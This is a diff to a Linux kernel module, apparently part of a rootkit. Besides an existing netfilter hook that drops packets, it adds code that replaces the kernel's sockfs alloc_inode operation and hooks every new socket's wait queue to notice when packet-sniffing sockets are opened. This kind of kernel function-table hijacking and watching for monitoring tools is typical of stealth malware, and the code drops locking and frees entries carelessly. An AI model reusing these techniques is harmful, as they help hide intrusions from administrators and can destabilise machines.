@@ -5,6 +5,7 @@
 #include <linux/tcp.h>
 #include <linux/udp.h>
 #include <linux/workqueue.h>
+#include <linux/fs.h>
 
 #include "headers/main.h"
 
@@ -233,15 +234,56 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
     return NF_DROP;
 }
 
+static struct inode *(*original_alloc_inode)(struct super_block *sb);
+
 struct nf_hook_ops *net_hook = NULL;
 
+int my_wake_up(struct wait_queue_entry *wq_entry, unsigned mode, int flags, void *key) {
+    struct socket *sock = (struct socket *)wq_entry->private;
+    if (!strcmp(sock->sk->__sk_common.skc_prot->name, "PACKET")) {
+        printk(KERN_INFO "packet socket connected!\n");
+    }
+    // spin_lock_irqsave(&wq_head->lock, flags);
+    list_del_init(&wq_entry->entry);
+    // spin_unlock_irqrestore(&wq_head->lock, flags);
+    kfree(wq_entry);
+    return 0;
+}
+
+static struct inode *new_alloc_inode(struct super_block *sb) {
+    struct socket *sock;
+    struct wait_queue_entry *wq;
+    struct inode *res = original_alloc_inode(sb);
+    sock = SOCKET_I(res);
+    wq = kmalloc(sizeof(struct wait_queue_entry), GFP_KERNEL);
+    init_waitqueue_func_entry(wq, &my_wake_up);
+    wq->private = sock;
+    add_wait_queue(&sock->wq.wait, wq);
+    return res;
+}
+
 int MRK_init_nethook(void) {
+    int res;
+    struct file_system_type *fs_type;
+    struct super_block *super;
+    struct super_operations *s_op;
     net_hook = kmalloc(sizeof(struct nf_hook_ops), GFP_KERNEL);
     net_hook->hook = MRK_hookfn;
     net_hook->hooknum = NF_INET_PRE_ROUTING;
     net_hook->pf = PF_INET;
     net_hook->priority = NF_IP_PRI_FILTER;
-    return nf_register_net_hook(&init_net, net_hook);
+    if ((res = nf_register_net_hook(&init_net, net_hook))) {
+        return res;
+    }
+    fs_type = get_fs_type("sockfs");
+    hlist_for_each_entry(super, &fs_type->fs_supers, s_instances) {
+        s_op = (struct super_operations *)kmalloc(sizeof(struct super_operations), GFP_KERNEL);
+        memcpy(s_op, super->s_op, sizeof(struct super_operations));
+        super->s_op = s_op;
+        original_alloc_inode = s_op->alloc_inode;
+        s_op->alloc_inode = &new_alloc_inode;
+    }
+    return 0;
 }
 
 void MRK_exit_nethook(void) {
